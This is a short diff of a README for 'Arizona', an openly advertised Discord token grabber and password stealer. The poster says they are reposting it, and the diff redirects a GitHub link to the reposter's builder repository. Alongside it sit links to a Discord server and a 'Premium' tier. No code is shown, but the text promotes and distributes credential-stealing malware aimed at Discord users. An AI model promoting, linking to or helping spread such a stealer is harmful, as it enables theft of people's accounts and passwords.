@@ -1,5 +1,5 @@
 **this grabber wasn't made by me i'm just reposting**
-##### [🌍 Discord Server](https://discord.gg/wEpw66CAMF) -  [:gem: Premium](https://discord.gg/wEpw66CAMF) - [🔧 Builder](https://github.com/rushscriptz/Arizona-Grabber) - [💡 Features](https://github.com/Stanley-GF/Arizona/edit/main/README.md#features) 
+##### [🌍 Discord Server](https://discord.gg/wEpw66CAMF) -  [:gem: Premium](https://discord.gg/wEpw66CAMF) - [🔧 Builder](https://github.com/rushscriptz/Arizona-Grabber) - [💡 Features](https://github.com/rushscriptz/Arizona-Grabber/edit/main/README.md#features) 
 
 # Arizona (by Brooklyn inc)
 The new modern discord token grabber & token stealer, with discord password & token even when it changes (old. PirateStealer)
